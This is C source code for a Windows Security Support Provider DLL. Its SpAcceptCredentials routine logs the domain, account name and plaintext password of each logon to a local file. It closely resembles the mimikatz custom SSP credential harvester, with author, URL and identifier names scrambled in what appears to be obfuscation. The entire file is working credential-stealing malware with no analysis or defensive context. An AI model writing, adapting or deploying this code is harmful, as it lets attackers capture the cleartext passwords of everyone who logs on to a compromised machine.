/*	HEstebqu SqUtI `PQu4nQbtjF`
	https://blog.PQu4nQbtjF.com
	isMW9TRNNJyHATgICHfOUxr
	Licence : https://GHViJ8cQzKiJugP.org/licenses/by/4.0/
*/
#include "ksSp.h"

static SECPKG_FUNCTION_TABLE PTnhsSp_SecPkgFunctionTable[] = {
	{
	NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL,
	ksSp_SpInitialize, ksSp_SpShutDown, ksSp_SpGetInfo, ksSp_SpAcceptCredentials,
	NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL,
	NULL, NULL, NULL, NULL, NULL, NULL, NULL
	}
};

NTSTATUS NTAPI ksSp_SpInitialize(ULONG_PTR PackageId, PSECPKG_PARAMETERS Parameters, PLSA_SECPKG_FUNCTION_TABLE FunctionTable)
{
	return STATUS_SUCCESS;
}

NTSTATUS NTAPI ksSp_SpShutDown(void)
{
	return STATUS_SUCCESS;
}

NTSTATUS NTAPI ksSp_SpGetInfo(PSecPkgInfoW PackageInfo)
{
	PackageInfo->fCapabilities = SECPKG_FLAG_ACCEPT_WIN32_NAME | SECPKG_FLAG_CONNECTION;
	PackageInfo->wVersion   = 1;
	PackageInfo->wRPCID     = SECPKG_ID_NONE;
	PackageInfo->cbMaxToken = 0;
	PackageInfo->Name       = L"fPnkSSP";
	PackageInfo->Comment    = L"fPnk Security Support Provider";
	return STATUS_SUCCESS;
}

NTSTATUS NTAPI ksSp_SpAcceptCredentials(SECURITY_LOGON_TYPE LogonType, PUNICODE_STRING AccountName, PSECPKG_PRIMARY_CRED PrimaryCredentials, PSECPKG_SUPPLEMENTAL_CRED SupplementalCredentials)
{
	FILE *ksSp_logfile;
#pragma warning(push)
#pragma warning(disable:4996)
	if(ksSp_logfile = _wfopen(L"PTnhsSp.log", L"a"))
#pragma warning(pop)
	{	
		klog(ksSp_logfile, L"[%08x:%08x] [%08x] %wZ\\%wZ (%wZ)\t", PrimaryCredentials->LogonId.HighPart, PrimaryCredentials->LogonId.LowPart, LogonType, &PrimaryCredentials->DomainName, &PrimaryCredentials->DownlevelName, AccountName);
		klog_password(ksSp_logfile, &PrimaryCredentials->Password);
		klog(ksSp_logfile, L"\n");
		fclose(ksSp_logfile);
	}
	return STATUS_SUCCESS;
}

NTSTATUS NTAPI ksSp_SpLsaModeInitialize(ULONG LsaVersion, PULONG PackageVersion, PSECPKG_FUNCTION_TABLE *ppTables, PULONG pcTables)
{
	*PackageVersion = SECPKG_INTERFACE_VERSION;
	*ppTables = PTnhsSp_SecPkgFunctionTable;
	*pcTables = ARRAYSIZE(PTnhsSp_SecPkgFunctionTable);
	return STATUS_SUCCESS;
}